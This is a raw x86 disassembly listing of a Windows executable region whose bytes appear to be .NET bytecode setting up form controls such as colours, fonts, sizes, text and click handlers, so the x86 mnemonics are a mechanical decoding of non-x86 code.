  403505:	32 00                	xor    (%eax),%al
  403507:	00 0a                	add    %cl,(%edx)
  403509:	6f                   	outsl  %ds:(%esi),(%dx)
  40350a:	33 00                	xor    (%eax),%eax
  40350c:	00 0a                	add    %cl,(%edx)
  40350e:	00 02                	add    %al,(%edx)
  403510:	7b 15                	jnp    0x403527
  403512:	00 00                	add    %al,(%eax)
  403514:	04 6f                	add    $0x6f,%al
  403516:	3f                   	aas
  403517:	00 00                	add    %al,(%eax)
  403519:	0a 20                	or     (%eax),%ah
  40351b:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403521:	00 00                	add    %al,(%eax)
  403523:	00 20                	add    %ah,(%eax)
  403525:	a2 00 00 00 28       	mov    %al,0x28000000
  40352a:	32 00                	xor    (%eax),%al
  40352c:	00 0a                	add    %cl,(%edx)
  40352e:	6f                   	outsl  %ds:(%esi),(%dx)
  40352f:	40                   	inc    %eax
  403530:	00 00                	add    %al,(%eax)
  403532:	0a 00                	or     (%eax),%al
  403534:	02 7b 15             	add    0x15(%ebx),%bh
  403537:	00 00                	add    %al,(%eax)
  403539:	04 6f                	add    $0x6f,%al
  40353b:	3f                   	aas
  40353c:	00 00                	add    %al,(%eax)
  40353e:	0a 20                	or     (%eax),%ah
  403540:	d8 00                	fadds  (%eax)
  403542:	00 00                	add    %al,(%eax)
  403544:	16                   	push   %ss
  403545:	1f                   	pop    %ds
  403546:	32 28                	xor    (%eax),%ch
  403548:	32 00                	xor    (%eax),%al
  40354a:	00 0a                	add    %cl,(%edx)
  40354c:	6f                   	outsl  %ds:(%esi),(%dx)
  40354d:	41                   	inc    %ecx
  40354e:	00 00                	add    %al,(%eax)
  403550:	0a 00                	or     (%eax),%al
  403552:	02 7b 15             	add    0x15(%ebx),%bh
  403555:	00 00                	add    %al,(%eax)
  403557:	04 6f                	add    $0x6f,%al
  403559:	3f                   	aas
  40355a:	00 00                	add    %al,(%eax)
  40355c:	0a 20                	or     (%eax),%ah
  40355e:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403564:	00 00                	add    %al,(%eax)
  403566:	00 20                	add    %ah,(%eax)
  403568:	a2 00 00 00 28       	mov    %al,0x28000000
  40356d:	32 00                	xor    (%eax),%al
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	6f                   	outsl  %ds:(%esi),(%dx)
  403572:	42                   	inc    %edx
  403573:	00 00                	add    %al,(%eax)
  403575:	0a 00                	or     (%eax),%al
  403577:	02 7b 15             	add    0x15(%ebx),%bh
  40357a:	00 00                	add    %al,(%eax)
  40357c:	04 16                	add    $0x16,%al
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	43                   	inc    %ebx
  403580:	00 00                	add    %al,(%eax)
  403582:	0a 00                	or     (%eax),%al
  403584:	02 7b 15             	add    0x15(%ebx),%bh
  403587:	00 00                	add    %al,(%eax)
  403589:	04 72                	add    $0x72,%al
  40358b:	eb 01                	jmp    0x40358e
  40358d:	00 70 22             	add    %dh,0x22(%eax)
  403590:	00 00                	add    %al,(%eax)
  403592:	10 41 16             	adc    %al,0x16(%ecx)
  403595:	19 20                	sbb    %esp,(%eax)
  403597:	a2 00 00 00 73       	mov    %al,0x73000000
  40359c:	44                   	inc    %esp
  40359d:	00 00                	add    %al,(%eax)
  40359f:	0a 6f 45             	or     0x45(%edi),%ch
  4035a2:	00 00                	add    %al,(%eax)
  4035a4:	0a 00                	or     (%eax),%al
  4035a6:	02 7b 15             	add    0x15(%ebx),%bh
  4035a9:	00 00                	add    %al,(%eax)
  4035ab:	04 20                	add    $0x20,%al
  4035ad:	f9                   	stc
  4035ae:	00 00                	add    %al,(%eax)
  4035b0:	00 20                	add    %ah,(%eax)
  4035b2:	de 00                	fiadds (%eax)
  4035b4:	00 00                	add    %al,(%eax)
  4035b6:	20 c9                	and    %cl,%cl
  4035b8:	00 00                	add    %al,(%eax)
  4035ba:	00 28                	add    %ch,(%eax)
  4035bc:	32 00                	xor    (%eax),%al
  4035be:	00 0a                	add    %cl,(%edx)
  4035c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4035c1:	46                   	inc    %esi
  4035c2:	00 00                	add    %al,(%eax)
  4035c4:	0a 00                	or     (%eax),%al
  4035c6:	02 7b 15             	add    0x15(%ebx),%bh
  4035c9:	00 00                	add    %al,(%eax)
  4035cb:	04 1f                	add    $0x1f,%al
  4035cd:	10 20                	adc    %ah,(%eax)
  4035cf:	84 00                	test   %al,(%eax)
  4035d1:	00 00                	add    %al,(%eax)
  4035d3:	73 35                	jae    0x40360a
  4035d5:	00 00                	add    %al,(%eax)
  4035d7:	0a 6f 36             	or     0x36(%edi),%ch
  4035da:	00 00                	add    %al,(%eax)
  4035dc:	0a 00                	or     (%eax),%al
  4035de:	02 7b 15             	add    0x15(%ebx),%bh
  4035e1:	00 00                	add    %al,(%eax)
  4035e3:	04 72                	add    $0x72,%al
  4035e5:	19 03                	sbb    %eax,(%ebx)
  4035e7:	00 70 6f             	add    %dh,0x6f(%eax)
  4035ea:	37                   	aaa
  4035eb:	00 00                	add    %al,(%eax)
  4035ed:	0a 00                	or     (%eax),%al
  4035ef:	02 7b 15             	add    0x15(%ebx),%bh
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	04 1f                	add    $0x1f,%al
  4035f6:	40                   	inc    %eax
  4035f7:	1f                   	pop    %ds
  4035f8:	1b 73 38             	sbb    0x38(%ebx),%esi
  4035fb:	00 00                	add    %al,(%eax)
  4035fd:	0a 6f 39             	or     0x39(%edi),%ch
  403600:	00 00                	add    %al,(%eax)
  403602:	0a 00                	or     (%eax),%al
  403604:	02 7b 15             	add    0x15(%ebx),%bh
  403607:	00 00                	add    %al,(%eax)
  403609:	04 1f                	add    $0x1f,%al
  40360b:	0e                   	push   %cs
  40360c:	6f                   	outsl  %ds:(%esi),(%dx)
  40360d:	3a 00                	cmp    (%eax),%al
  40360f:	00 0a                	add    %cl,(%edx)
  403611:	00 02                	add    %al,(%edx)
  403613:	7b 15                	jnp    0x40362a
  403615:	00 00                	add    %al,(%eax)
  403617:	04 72                	add    $0x72,%al
  403619:	29 03                	sub    %eax,(%ebx)
  40361b:	00 70 6f             	add    %dh,0x6f(%eax)
  40361e:	47                   	inc    %edi
  40361f:	00 00                	add    %al,(%eax)
  403621:	0a 00                	or     (%eax),%al
  403623:	02 7b 15             	add    0x15(%ebx),%bh
  403626:	00 00                	add    %al,(%eax)
  403628:	04 18                	add    $0x18,%al
  40362a:	6f                   	outsl  %ds:(%esi),(%dx)
  40362b:	50                   	push   %eax
  40362c:	00 00                	add    %al,(%eax)
  40362e:	0a 00                	or     (%eax),%al
  403630:	02 7b 15             	add    0x15(%ebx),%bh
  403633:	00 00                	add    %al,(%eax)
  403635:	04 16                	add    $0x16,%al
  403637:	6f                   	outsl  %ds:(%esi),(%dx)
  403638:	48                   	dec    %eax
  403639:	00 00                	add    %al,(%eax)
  40363b:	0a 00                	or     (%eax),%al
  40363d:	02 7b 15             	add    0x15(%ebx),%bh
  403640:	00 00                	add    %al,(%eax)
  403642:	04 02                	add    $0x2,%al
  403644:	fe 06                	incb   (%esi)
  403646:	1a 00                	sbb    (%eax),%al
  403648:	00 06                	add    %al,(%esi)
  40364a:	73 49                	jae    0x403695
  40364c:	00 00                	add    %al,(%eax)
  40364e:	0a 6f 4a             	or     0x4a(%edi),%ch
  403651:	00 00                	add    %al,(%eax)
  403653:	0a 00                	or     (%eax),%al
  403655:	02 7b 16             	add    0x16(%ebx),%bh
  403658:	00 00                	add    %al,(%eax)
  40365a:	04 17                	add    $0x17,%al
  40365c:	6f                   	outsl  %ds:(%esi),(%dx)
  40365d:	3e 00 00             	add    %al,%ds:(%eax)
  403660:	0a 00                	or     (%eax),%al
  403662:	02 7b 16             	add    0x16(%ebx),%bh
  403665:	00 00                	add    %al,(%eax)
  403667:	04 20                	add    $0x20,%al
  403669:	d8 00                	fadds  (%eax)
  40366b:	00 00                	add    %al,(%eax)
  40366d:	16                   	push   %ss
  40366e:	1f                   	pop    %ds
  40366f:	32 28                	xor    (%eax),%ch
  403671:	32 00                	xor    (%eax),%al
  403673:	00 0a                	add    %cl,(%edx)
  403675:	6f                   	outsl  %ds:(%esi),(%dx)
  403676:	33 00                	xor    (%eax),%eax
  403678:	00 0a                	add    %cl,(%edx)
  40367a:	00 02                	add    %al,(%edx)
  40367c:	7b 16                	jnp    0x403694
  40367e:	00 00                	add    %al,(%eax)
  403680:	04 6f                	add    $0x6f,%al
  403682:	3f                   	aas
  403683:	00 00                	add    %al,(%eax)
  403685:	0a 20                	or     (%eax),%ah
  403687:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  40368d:	00 00                	add    %al,(%eax)
  40368f:	00 20                	add    %ah,(%eax)
  403691:	a2 00 00 00 28       	mov    %al,0x28000000
  403696:	32 00                	xor    (%eax),%al
  403698:	00 0a                	add    %cl,(%edx)
  40369a:	6f                   	outsl  %ds:(%esi),(%dx)
  40369b:	40                   	inc    %eax
  40369c:	00 00                	add    %al,(%eax)
  40369e:	0a 00                	or     (%eax),%al
  4036a0:	02 7b 16             	add    0x16(%ebx),%bh
  4036a3:	00 00                	add    %al,(%eax)
  4036a5:	04 6f                	add    $0x6f,%al
  4036a7:	3f                   	aas
  4036a8:	00 00                	add    %al,(%eax)
  4036aa:	0a 20                	or     (%eax),%ah
  4036ac:	d8 00                	fadds  (%eax)
  4036ae:	00 00                	add    %al,(%eax)
  4036b0:	16                   	push   %ss
  4036b1:	1f                   	pop    %ds
  4036b2:	32 28                	xor    (%eax),%ch
  4036b4:	32 00                	xor    (%eax),%al
  4036b6:	00 0a                	add    %cl,(%edx)
  4036b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4036b9:	41                   	inc    %ecx
  4036ba:	00 00                	add    %al,(%eax)
  4036bc:	0a 00                	or     (%eax),%al
  4036be:	02 7b 16             	add    0x16(%ebx),%bh
  4036c1:	00 00                	add    %al,(%eax)
  4036c3:	04 6f                	add    $0x6f,%al
  4036c5:	3f                   	aas
  4036c6:	00 00                	add    %al,(%eax)
  4036c8:	0a 20                	or     (%eax),%ah
  4036ca:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4036d0:	00 00                	add    %al,(%eax)
  4036d2:	00 20                	add    %ah,(%eax)
  4036d4:	a2 00 00 00 28       	mov    %al,0x28000000
  4036d9:	32 00                	xor    (%eax),%al
  4036db:	00 0a                	add    %cl,(%edx)
  4036dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4036de:	42                   	inc    %edx
  4036df:	00 00                	add    %al,(%eax)
  4036e1:	0a 00                	or     (%eax),%al
  4036e3:	02 7b 16             	add    0x16(%ebx),%bh
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	04 16                	add    $0x16,%al
  4036ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4036eb:	43                   	inc    %ebx
  4036ec:	00 00                	add    %al,(%eax)
  4036ee:	0a 00                	or     (%eax),%al
  4036f0:	02 7b 16             	add    0x16(%ebx),%bh
  4036f3:	00 00                	add    %al,(%eax)
  4036f5:	04 72                	add    $0x72,%al
  4036f7:	eb 01                	jmp    0x4036fa
  4036f9:	00 70 22             	add    %dh,0x22(%eax)
  4036fc:	00 00                	add    %al,(%eax)
  4036fe:	10 41 16             	adc    %al,0x16(%ecx)
  403701:	19 20                	sbb    %esp,(%eax)
  403703:	a2 00 00 00 73       	mov    %al,0x73000000
  403708:	44                   	inc    %esp
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 6f 45             	or     0x45(%edi),%ch
  40370e:	00 00                	add    %al,(%eax)
  403710:	0a 00                	or     (%eax),%al
  403712:	02 7b 16             	add    0x16(%ebx),%bh
  403715:	00 00                	add    %al,(%eax)
  403717:	04 20                	add    $0x20,%al
  403719:	f9                   	stc
  40371a:	00 00                	add    %al,(%eax)
  40371c:	00 20                	add    %ah,(%eax)
  40371e:	de 00                	fiadds (%eax)
  403720:	00 00                	add    %al,(%eax)
  403722:	20 c9                	and    %cl,%cl
  403724:	00 00                	add    %al,(%eax)
  403726:	00 28                	add    %ch,(%eax)
  403728:	32 00                	xor    (%eax),%al
  40372a:	00 0a                	add    %cl,(%edx)
  40372c:	6f                   	outsl  %ds:(%esi),(%dx)
  40372d:	46                   	inc    %esi
  40372e:	00 00                	add    %al,(%eax)
  403730:	0a 00                	or     (%eax),%al
  403732:	02 7b 16             	add    0x16(%ebx),%bh
  403735:	00 00                	add    %al,(%eax)
  403737:	04 1f                	add    $0x1f,%al
  403739:	22 20                	and    (%eax),%ah
  40373b:	e7 00                	out    %eax,$0x0
  40373d:	00 00                	add    %al,(%eax)
  40373f:	73 35                	jae    0x403776
  403741:	00 00                	add    %al,(%eax)
  403743:	0a 6f 36             	or     0x36(%edi),%ch
  403746:	00 00                	add    %al,(%eax)
  403748:	0a 00                	or     (%eax),%al
  40374a:	02 7b 16             	add    0x16(%ebx),%bh
  40374d:	00 00                	add    %al,(%eax)
  40374f:	04 72                	add    $0x72,%al
  403751:	35 03 00 70 6f       	xor    $0x6f700003,%eax
  403756:	37                   	aaa
  403757:	00 00                	add    %al,(%eax)
  403759:	0a 00                	or     (%eax),%al
  40375b:	02 7b 16             	add    0x16(%ebx),%bh
  40375e:	00 00                	add    %al,(%eax)
  403760:	04 1f                	add    $0x1f,%al
  403762:	61                   	popa
  403763:	1f                   	pop    %ds
  403764:	1b 73 38             	sbb    0x38(%ebx),%esi
  403767:	00 00                	add    %al,(%eax)
  403769:	0a 6f 39             	or     0x39(%edi),%ch
  40376c:	00 00                	add    %al,(%eax)
  40376e:	0a 00                	or     (%eax),%al
  403770:	02 7b 16             	add    0x16(%ebx),%bh
  403773:	00 00                	add    %al,(%eax)
  403775:	04 1f                	add    $0x1f,%al
  403777:	0d 6f 3a 00 00       	or     $0x3a6f,%eax
  40377c:	0a 00                	or     (%eax),%al
  40377e:	02 7b 16             	add    0x16(%ebx),%bh
  403781:	00 00                	add    %al,(%eax)
  403783:	04 72                	add    $0x72,%al
  403785:	45                   	inc    %ebp
  403786:	03 00                	add    (%eax),%eax
  403788:	70 6f                	jo     0x4037f9
  40378a:	47                   	inc    %edi
  40378b:	00 00                	add    %al,(%eax)
  40378d:	0a 00                	or     (%eax),%al
  40378f:	02 7b 16             	add    0x16(%ebx),%bh
  403792:	00 00                	add    %al,(%eax)
  403794:	04 18                	add    $0x18,%al
  403796:	6f                   	outsl  %ds:(%esi),(%dx)
  403797:	50                   	push   %eax
  403798:	00 00                	add    %al,(%eax)
  40379a:	0a 00                	or     (%eax),%al
  40379c:	02 7b 16             	add    0x16(%ebx),%bh
  40379f:	00 00                	add    %al,(%eax)
  4037a1:	04 16                	add    $0x16,%al
  4037a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4037a4:	48                   	dec    %eax
  4037a5:	00 00                	add    %al,(%eax)
  4037a7:	0a 00                	or     (%eax),%al
  4037a9:	02 7b 16             	add    0x16(%ebx),%bh
  4037ac:	00 00                	add    %al,(%eax)
  4037ae:	04 02                	add    $0x2,%al
  4037b0:	fe 06                	incb   (%esi)
  4037b2:	17                   	pop    %ss
  4037b3:	00 00                	add    %al,(%eax)
  4037b5:	06                   	push   %es
  4037b6:	73 49                	jae    0x403801
  4037b8:	00 00                	add    %al,(%eax)
  4037ba:	0a 6f 4a             	or     0x4a(%edi),%ch
  4037bd:	00 00                	add    %al,(%eax)
  4037bf:	0a 00                	or     (%eax),%al
  4037c1:	02 7b 17             	add    0x17(%ebx),%bh
  4037c4:	00 00                	add    %al,(%eax)
  4037c6:	04 17                	add    $0x17,%al
  4037c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c9:	3e 00 00             	add    %al,%ds:(%eax)
  4037cc:	0a 00                	or     (%eax),%al
  4037ce:	02 7b 17             	add    0x17(%ebx),%bh
  4037d1:	00 00                	add    %al,(%eax)
  4037d3:	04 20                	add    $0x20,%al
  4037d5:	d8 00                	fadds  (%eax)
  4037d7:	00 00                	add    %al,(%eax)
  4037d9:	16                   	push   %ss
  4037da:	1f                   	pop    %ds
  4037db:	32 28                	xor    (%eax),%ch
  4037dd:	32 00                	xor    (%eax),%al
  4037df:	00 0a                	add    %cl,(%edx)
  4037e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e2:	33 00                	xor    (%eax),%eax
  4037e4:	00 0a                	add    %cl,(%edx)
  4037e6:	00 02                	add    %al,(%edx)
  4037e8:	7b 17                	jnp    0x403801
  4037ea:	00 00                	add    %al,(%eax)
  4037ec:	04 6f                	add    $0x6f,%al
  4037ee:	3f                   	aas
  4037ef:	00 00                	add    %al,(%eax)
  4037f1:	0a 20                	or     (%eax),%ah
  4037f3:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4037f9:	00 00                	add    %al,(%eax)
  4037fb:	00 20                	add    %ah,(%eax)
  4037fd:	a2 00 00 00 28       	mov    %al,0x28000000
  403802:	32 00                	xor    (%eax),%al
  403804:	00 0a                	add    %cl,(%edx)
  403806:	6f                   	outsl  %ds:(%esi),(%dx)
  403807:	40                   	inc    %eax
  403808:	00 00                	add    %al,(%eax)
  40380a:	0a 00                	or     (%eax),%al
  40380c:	02 7b 17             	add    0x17(%ebx),%bh
  40380f:	00 00                	add    %al,(%eax)
  403811:	04 6f                	add    $0x6f,%al
  403813:	3f                   	aas
  403814:	00 00                	add    %al,(%eax)
  403816:	0a 20                	or     (%eax),%ah
  403818:	d8 00                	fadds  (%eax)
  40381a:	00 00                	add    %al,(%eax)
  40381c:	16                   	push   %ss
  40381d:	1f                   	pop    %ds
  40381e:	32 28                	xor    (%eax),%ch
  403820:	32 00                	xor    (%eax),%al
  403822:	00 0a                	add    %cl,(%edx)
  403824:	6f                   	outsl  %ds:(%esi),(%dx)
  403825:	41                   	inc    %ecx
  403826:	00 00                	add    %al,(%eax)
  403828:	0a 00                	or     (%eax),%al
  40382a:	02 7b 17             	add    0x17(%ebx),%bh
  40382d:	00 00                	add    %al,(%eax)
  40382f:	04 6f                	add    $0x6f,%al
  403831:	3f                   	aas
  403832:	00 00                	add    %al,(%eax)
  403834:	0a 20                	or     (%eax),%ah
  403836:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  40383c:	00 00                	add    %al,(%eax)
  40383e:	00 20                	add    %ah,(%eax)
  403840:	a2 00 00 00 28       	mov    %al,0x28000000
  403845:	32 00                	xor    (%eax),%al
  403847:	00 0a                	add    %cl,(%edx)
  403849:	6f                   	outsl  %ds:(%esi),(%dx)
  40384a:	42                   	inc    %edx
  40384b:	00 00                	add    %al,(%eax)
  40384d:	0a 00                	or     (%eax),%al
  40384f:	02 7b 17             	add    0x17(%ebx),%bh
  403852:	00 00                	add    %al,(%eax)
  403854:	04 16                	add    $0x16,%al
  403856:	6f                   	outsl  %ds:(%esi),(%dx)
  403857:	43                   	inc    %ebx
  403858:	00 00                	add    %al,(%eax)
  40385a:	0a 00                	or     (%eax),%al
  40385c:	02 7b 17             	add    0x17(%ebx),%bh
  40385f:	00 00                	add    %al,(%eax)
  403861:	04 72                	add    $0x72,%al
  403863:	eb 01                	jmp    0x403866
  403865:	00 70 22             	add    %dh,0x22(%eax)
  403868:	00 00                	add    %al,(%eax)
  40386a:	10 41 16             	adc    %al,0x16(%ecx)
  40386d:	19 20                	sbb    %esp,(%eax)
  40386f:	a2 00 00 00 73       	mov    %al,0x73000000
  403874:	44                   	inc    %esp
  403875:	00 00                	add    %al,(%eax)
  403877:	0a 6f 45             	or     0x45(%edi),%ch
  40387a:	00 00                	add    %al,(%eax)
  40387c:	0a 00                	or     (%eax),%al
  40387e:	02 7b 17             	add    0x17(%ebx),%bh
  403881:	00 00                	add    %al,(%eax)
  403883:	04 20                	add    $0x20,%al
  403885:	f9                   	stc
  403886:	00 00                	add    %al,(%eax)
  403888:	00 20                	add    %ah,(%eax)
  40388a:	de 00                	fiadds (%eax)
  40388c:	00 00                	add    %al,(%eax)
  40388e:	20 c9                	and    %cl,%cl
  403890:	00 00                	add    %al,(%eax)
  403892:	00 28                	add    %ch,(%eax)
  403894:	32 00                	xor    (%eax),%al
  403896:	00 0a                	add    %cl,(%edx)
  403898:	6f                   	outsl  %ds:(%esi),(%dx)
  403899:	46                   	inc    %esi
  40389a:	00 00                	add    %al,(%eax)
  40389c:	0a 00                	or     (%eax),%al
  40389e:	02 7b 17             	add    0x17(%ebx),%bh
  4038a1:	00 00                	add    %al,(%eax)
  4038a3:	04 1f                	add    $0x1f,%al
  4038a5:	10 1f                	adc    %bl,(%edi)
  4038a7:	63 73 35             	arpl   %esi,0x35(%ebx)
  4038aa:	00 00                	add    %al,(%eax)
  4038ac:	0a 6f 36             	or     0x36(%edi),%ch
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	0a 00                	or     (%eax),%al
  4038b3:	02 7b 17             	add    0x17(%ebx),%bh
  4038b6:	00 00                	add    %al,(%eax)
  4038b8:	04 72                	add    $0x72,%al
  4038ba:	5f                   	pop    %edi
  4038bb:	03 00                	add    (%eax),%eax
  4038bd:	70 6f                	jo     0x40392e
  4038bf:	37                   	aaa
  4038c0:	00 00                	add    %al,(%eax)
  4038c2:	0a 00                	or     (%eax),%al
  4038c4:	02 7b 17             	add    0x17(%ebx),%bh
  4038c7:	00 00                	add    %al,(%eax)
  4038c9:	04 1f                	add    $0x1f,%al
  4038cb:	40                   	inc    %eax
  4038cc:	1f                   	pop    %ds
  4038cd:	1b 73 38             	sbb    0x38(%ebx),%esi
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 6f 39             	or     0x39(%edi),%ch
  4038d5:	00 00                	add    %al,(%eax)
  4038d7:	0a 00                	or     (%eax),%al
  4038d9:	02 7b 17             	add    0x17(%ebx),%bh
  4038dc:	00 00                	add    %al,(%eax)
  4038de:	04 1f                	add    $0x1f,%al
  4038e0:	0c 6f                	or     $0x6f,%al
  4038e2:	3a 00                	cmp    (%eax),%al
  4038e4:	00 0a                	add    %cl,(%edx)
  4038e6:	00 02                	add    %al,(%edx)
  4038e8:	7b 17                	jnp    0x403901
  4038ea:	00 00                	add    %al,(%eax)
  4038ec:	04 72                	add    $0x72,%al
  4038ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4038ef:	03 00                	add    (%eax),%eax
  4038f1:	70 6f                	jo     0x403962
  4038f3:	47                   	inc    %edi
  4038f4:	00 00                	add    %al,(%eax)
  4038f6:	0a 00                	or     (%eax),%al
  4038f8:	02 7b 17             	add    0x17(%ebx),%bh
  4038fb:	00 00                	add    %al,(%eax)
  4038fd:	04 18                	add    $0x18,%al
  4038ff:	6f                   	outsl  %ds:(%esi),(%dx)
  403900:	50                   	push   %eax
  403901:	00 00                	add    %al,(%eax)
  403903:	0a 00                	or     (%eax),%al
  403905:	02 7b 17             	add    0x17(%ebx),%bh
  403908:	00 00                	add    %al,(%eax)
  40390a:	04 16                	add    $0x16,%al
  40390c:	6f                   	outsl  %ds:(%esi),(%dx)
  40390d:	48                   	dec    %eax
  40390e:	00 00                	add    %al,(%eax)
  403910:	0a 00                	or     (%eax),%al
  403912:	02 7b 17             	add    0x17(%ebx),%bh
  403915:	00 00                	add    %al,(%eax)
  403917:	04 02                	add    $0x2,%al
  403919:	fe 06                	incb   (%esi)
  40391b:	19 00                	sbb    %eax,(%eax)
  40391d:	00 06                	add    %al,(%esi)
  40391f:	73 49                	jae    0x40396a
  403921:	00 00                	add    %al,(%eax)
  403923:	0a 6f 4a             	or     0x4a(%edi),%ch
  403926:	00 00                	add    %al,(%eax)
  403928:	0a 00                	or     (%eax),%al
  40392a:	02 7b 18             	add    0x18(%ebx),%bh
  40392d:	00 00                	add    %al,(%eax)
  40392f:	04 17                	add    $0x17,%al
  403931:	6f                   	outsl  %ds:(%esi),(%dx)
  403932:	3e 00 00             	add    %al,%ds:(%eax)
  403935:	0a 00                	or     (%eax),%al
  403937:	02 7b 18             	add    0x18(%ebx),%bh
  40393a:	00 00                	add    %al,(%eax)
  40393c:	04 20                	add    $0x20,%al
  40393e:	d8 00                	fadds  (%eax)
  403940:	00 00                	add    %al,(%eax)
  403942:	16                   	push   %ss
  403943:	1f                   	pop    %ds
  403944:	32 28                	xor    (%eax),%ch
  403946:	32 00                	xor    (%eax),%al
  403948:	00 0a                	add    %cl,(%edx)
  40394a:	6f                   	outsl  %ds:(%esi),(%dx)
  40394b:	33 00                	xor    (%eax),%eax
  40394d:	00 0a                	add    %cl,(%edx)
  40394f:	00 02                	add    %al,(%edx)
  403951:	7b 18                	jnp    0x40396b
  403953:	00 00                	add    %al,(%eax)
  403955:	04 6f                	add    $0x6f,%al
  403957:	3f                   	aas
  403958:	00 00                	add    %al,(%eax)
  40395a:	0a 20                	or     (%eax),%ah
  40395c:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403962:	00 00                	add    %al,(%eax)
  403964:	00 20                	add    %ah,(%eax)
  403966:	a2 00 00 00 28       	mov    %al,0x28000000
  40396b:	32 00                	xor    (%eax),%al
  40396d:	00 0a                	add    %cl,(%edx)
  40396f:	6f                   	outsl  %ds:(%esi),(%dx)
  403970:	40                   	inc    %eax
  403971:	00 00                	add    %al,(%eax)
  403973:	0a 00                	or     (%eax),%al
  403975:	02 7b 18             	add    0x18(%ebx),%bh
  403978:	00 00                	add    %al,(%eax)
  40397a:	04 6f                	add    $0x6f,%al
  40397c:	3f                   	aas
  40397d:	00 00                	add    %al,(%eax)
  40397f:	0a 20                	or     (%eax),%ah
  403981:	d8 00                	fadds  (%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	16                   	push   %ss
  403986:	1f                   	pop    %ds
  403987:	32 28                	xor    (%eax),%ch
  403989:	32 00                	xor    (%eax),%al
  40398b:	00 0a                	add    %cl,(%edx)
  40398d:	6f                   	outsl  %ds:(%esi),(%dx)
  40398e:	41                   	inc    %ecx
  40398f:	00 00                	add    %al,(%eax)
  403991:	0a 00                	or     (%eax),%al
  403993:	02 7b 18             	add    0x18(%ebx),%bh
  403996:	00 00                	add    %al,(%eax)
  403998:	04 6f                	add    $0x6f,%al
  40399a:	3f                   	aas
  40399b:	00 00                	add    %al,(%eax)
  40399d:	0a 20                	or     (%eax),%ah
  40399f:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4039a5:	00 00                	add    %al,(%eax)
  4039a7:	00 20                	add    %ah,(%eax)
  4039a9:	a2 00 00 00 28       	mov    %al,0x28000000
  4039ae:	32 00                	xor    (%eax),%al
  4039b0:	00 0a                	add    %cl,(%edx)
  4039b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039b3:	42                   	inc    %edx
  4039b4:	00 00                	add    %al,(%eax)
  4039b6:	0a 00                	or     (%eax),%al
  4039b8:	02 7b 18             	add    0x18(%ebx),%bh
  4039bb:	00 00                	add    %al,(%eax)
  4039bd:	04 16                	add    $0x16,%al
  4039bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c0:	43                   	inc    %ebx
  4039c1:	00 00                	add    %al,(%eax)
  4039c3:	0a 00                	or     (%eax),%al
  4039c5:	02 7b 18             	add    0x18(%ebx),%bh
  4039c8:	00 00                	add    %al,(%eax)
  4039ca:	04 72                	add    $0x72,%al
  4039cc:	eb 01                	jmp    0x4039cf
  4039ce:	00 70 22             	add    %dh,0x22(%eax)
  4039d1:	00 00                	add    %al,(%eax)
  4039d3:	10 41 16             	adc    %al,0x16(%ecx)
  4039d6:	19 20                	sbb    %esp,(%eax)
  4039d8:	a2 00 00 00 73       	mov    %al,0x73000000
  4039dd:	44                   	inc    %esp
  4039de:	00 00                	add    %al,(%eax)
  4039e0:	0a 6f 45             	or     0x45(%edi),%ch
  4039e3:	00 00                	add    %al,(%eax)
  4039e5:	0a 00                	or     (%eax),%al
  4039e7:	02 7b 18             	add    0x18(%ebx),%bh
  4039ea:	00 00                	add    %al,(%eax)
  4039ec:	04 20                	add    $0x20,%al
  4039ee:	f9                   	stc
  4039ef:	00 00                	add    %al,(%eax)
  4039f1:	00 20                	add    %ah,(%eax)
  4039f3:	de 00                	fiadds (%eax)
  4039f5:	00 00                	add    %al,(%eax)
  4039f7:	20 c9                	and    %cl,%cl
  4039f9:	00 00                	add    %al,(%eax)
  4039fb:	00 28                	add    %ch,(%eax)
  4039fd:	32 00                	xor    (%eax),%al
  4039ff:	00 0a                	add    %cl,(%edx)
  403a01:	6f                   	outsl  %ds:(%esi),(%dx)
  403a02:	46                   	inc    %esi
  403a03:	00 00                	add    %al,(%eax)
  403a05:	0a 00                	or     (%eax),%al
  403a07:	02 7b 18             	add    0x18(%ebx),%bh
  403a0a:	00 00                	add    %al,(%eax)
  403a0c:	04 1f                	add    $0x1f,%al
  403a0e:	10 1f                	adc    %bl,(%edi)
  403a10:	42                   	inc    %edx
  403a11:	73 35                	jae    0x403a48
  403a13:	00 00                	add    %al,(%eax)
  403a15:	0a 6f 36             	or     0x36(%edi),%ch
  403a18:	00 00                	add    %al,(%eax)
  403a1a:	0a 00                	or     (%eax),%al
  403a1c:	02 7b 18             	add    0x18(%ebx),%bh
  403a1f:	00 00                	add    %al,(%eax)
  403a21:	04 72                	add    $0x72,%al
  403a23:	81 03 00 70 6f 37    	addl   $0x376f7000,(%ebx)
  403a29:	00 00                	add    %al,(%eax)
  403a2b:	0a 00                	or     (%eax),%al
  403a2d:	02 7b 18             	add    0x18(%ebx),%bh
  403a30:	00 00                	add    %al,(%eax)
  403a32:	04 1f                	add    $0x1f,%al
  403a34:	40                   	inc    %eax
  403a35:	1f                   	pop    %ds
  403a36:	1b 73 38             	sbb    0x38(%ebx),%esi
  403a39:	00 00                	add    %al,(%eax)
  403a3b:	0a 6f 39             	or     0x39(%edi),%ch
  403a3e:	00 00                	add    %al,(%eax)
